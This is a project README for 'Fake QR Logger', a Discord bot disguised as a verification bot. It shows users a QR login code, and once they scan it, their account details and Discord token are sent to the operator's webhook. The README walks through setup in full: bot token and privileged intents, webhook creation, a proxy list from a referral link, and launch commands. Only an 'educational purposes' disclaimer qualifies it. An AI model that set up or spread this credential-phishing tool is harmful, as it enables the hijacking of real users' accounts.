# Fake QR Logger

This project shows the danger of Login via QR Code. It uses a discord bot to make it look like a verification bot. When an user is trying to verify, the QR will be fetched from the webdriver and sent. When scanned and pressed, the information of the user (including Discord Token) will be sent to a webhook.

## Version

Current Version: 1.0.1 (Last Update: 2023-20-07)
> Released full project

## Disclaimer

This project is for educational purposes only. Any illegal or unethical use of the provided code or information is not endorsed. Users assume full responsibility for their actions, and the creator disclaims any liability for the consequences of misuse. Please use this project responsibly and in accordance with applicable laws and ethical standards.

## Table of Contents
- [Showcase](#showcase)
- [Installation](#installation)
- [Usage](#usage)
- [Licence](#licence)
- [Credits](#credits)

## Showcase

<img src="/img/preview_1.png" alt="preview_1">

<img src="/img/preview_2.png" alt="preview_2">

<img src="/img/preview_3.png" alt="preview_3">

## Installation

### Requirements

* Windows (10/11)
* Python (3.9)

### Setup

1. [Download the source code](https://github.com/lizard0x/Fake-QR-Logger/archive/refs/heads/main.zip)
2. Extract the zip
3. Run `setup.bat`

### Configuration


Before running, `config.json` (found in the main folder) should be configured as followed:
```
{
  "botToken": "BOTTOKEN-HERE",
  "webhookUrl": "WEBHOOKURL-HERE",
  "prefix": "!"
}
```
**Start off by getting the bot token:**
1. Head to the [Discord Application Page](https://discord.com/developers/applications)
2. Press on "New application", and give it the name you like. The name of the bot can be changed later.
3. On your left, click on "Bot"
4. Here, change the name of the bot and the icon as how you like it.
5. Under "Privileged Gateway Intents", select all three boxes.
6. Save changes and press "Reset token". After resetting it, copy it.
7. Replace `BOTTOKEN-HERE` (keep the quotes) with the token. Keep in mind that whenever you reset your token, you should replace it.

**Next up is your webhook URL:**
1. Head to your server on the Discord website or dekstop app.
2. Select or make a channel.
3. Next to the channel name, press on the gear icon.
4. On the left, head to integrations > View Webhooks.
5. Press on "New Webhook" to create a webhook.
6. Change the name and icon as you like and press on "Copy Webhook URL".
7. Replace `WEBHOOKURL-HERE` (keep the quotes) with the URL. Keep in mind that whenever the webhook is deleted, you should replace it.

The last step is to paste the configuration text in `config.json`

**Now the very last thing to do is configuring `proxies.txt` (found in the main folder):**
1. [Head to this site](https://www.webshare.io/?referral_code=q1x8ce6gij68)
2. Press the "Sign Up" button in the right upper corner and create a new account.
3. After signing up, you should see a list of proxies.
4. On the left, go to Proxy > Settings and head to the "IP Authorizations" tab.
5. Under "IP Authorizations" it should say "Your IP address is ...". Press on the numbers to copy your IP.
6. Press on "Add New IP Address" and paste in your IP, after which you need to press "Save".

> **Note: Your IP may change overtime. If the script gives an error, you may need to repeat the steps.**

7. Now on the left, head to Proxy > List.
8. Under "Authentication Method", change "Username/Password" to "Ip Authentication".
9. After, press on "Download" under "ALL" and press "DOWNLOAD PROXY LIST".
10. Open the file that was just downloaded and make sure the format is `123.123.123:123`, otherwise check steps 4-8.
11. Copy the contents of the file, and paste  them in `proxies.txt` (found in the main folder)

If you want to, you can also change the prefix. This is the thing that you say before a command.
For example, when the prefix is set to `!`, this is how you call a command:
`!command`

When running in any problems, please make sure you have the [requirements](#requirements) installed.

## Usage

Make sure you've done all previous steps before continueing.
1. To get the bot online, run `main.py` (found in the main folder)
2. Starting the setup is done by using the `!setup` command (replace prefix when custom is set.) in the server that contains your bot.
3. Upon an user pressing the verify button, the process should automatically start.
4. When the user succesfully logs in, the webhook should ping everyone and should send the information.

## Licence
This project is licenced under the [MIT Licence](https://mit-license.org/)

## Credits
Alot of credits to [AstraaDev](https://github.com/AstraaDev) for the idea.
